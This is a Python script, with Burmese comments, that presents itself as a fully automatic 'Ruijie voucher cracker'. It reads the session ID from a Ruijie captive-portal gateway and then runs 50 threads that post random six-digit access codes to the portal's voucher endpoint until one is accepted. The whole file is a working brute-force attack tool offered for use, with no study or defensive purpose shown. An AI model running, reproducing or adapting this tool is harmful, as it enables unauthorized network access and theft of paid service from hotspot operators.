import sys, os, hashlib, subprocess, datetime, requests, time, random, string, threading, re
from colorama import Fore, Style, init

init(autoreset=True)

# CONFIGURATION
SALT = "AHO_PRO_FINAL_2026_SECURE"
_found = False
_active_codes = ["......"] * 5

def get_auto_sid():
    # ဖုန်းရဲ့ Browser ထဲမှာ ပွင့်နေတဲ့ Ruijie Portal ကနေ SID ကို Auto ဆွဲယူတဲ့ Logic
    try:
        # Gateway URL ကို အရင်စစ်မယ်
        gateway = "http://192.168.110.1"
        res = requests.get(f"{gateway}/index.php", timeout=3, verify=False)
        # URL link ထဲမှာပါတဲ့ sid=... ကို ရှာမယ်
        match = re.search(r'sid=([a-zA-Z0-9]+)', res.url)
        if match:
            return match.group(1)
        # အကယ်၍ URL မှာ မပါရင် Cookie ထဲမှာ ရှာမယ်
        sid = res.cookies.get('p_sid') or res.cookies.get('sessionid')
        return sid
    except:
        return None

def _crack(host, sid, slot):
    global _found
    sess = requests.Session()
    while not _found:
        v = "".join(random.choice(string.digits) for _ in range(6))
        _active_codes[slot % 5] = v
        try:
            payload = {"accessCode": v, "sessionId": sid, "authType": "voucher", "apiVersion": 1}
            res = sess.post(f"{host}/api/auth/voucher/", json=payload, timeout=5, verify=False)
            if res.status_code == 200 and (res.json().get('error') == 0 or res.json().get('success')):
                _found = True
                print(f"\n\n{Fore.GREEN}[✔] SUCCESS! VOUCHER FOUND: {v}")
                os._exit(0)
        except: pass

def main():
    os.system('clear')
    print(f"{Fore.CYAN}=== RUIJIE VOUCHER CRACKER (FULL AUTO) ===")
    
    print(f"{Fore.YELLOW}[*] Scanning for Ruijie SID... Please wait.")
    sid = get_auto_sid()
    
    # အကယ်၍ Auto ရှာလို့မတွေ့ရင် (ဥပမာ- WiFi မချိတ်ထားရင်)
    if not sid:
        print(f"{Fore.RED}[✘] Error: Could not find Ruijie SID automatically!")
        print(f"{Fore.WHITE}Please connect to Ruijie WiFi first.")
        return

    host = "http://192.168.110.1"
    print(f"{Fore.GREEN}[✓] SID FOUND: {sid}")
    print(f"{Fore.YELLOW}[*] Starting Attack with 50 Threads...")

    for i in range(50):
        threading.Thread(target=_crack, args=(host, sid, i), daemon=True).start()
    
    while not _found:
        st = " | ".join([f"{Fore.CYAN}{c}{Fore.RESET}" for c in _active_codes])
        sys.stdout.write(f"\r{Fore.MAGENTA}[☠] TRYING: {st} ")
        sys.stdout.flush()
        time.sleep(0.08)

if __name__ == "__main__":
    main()

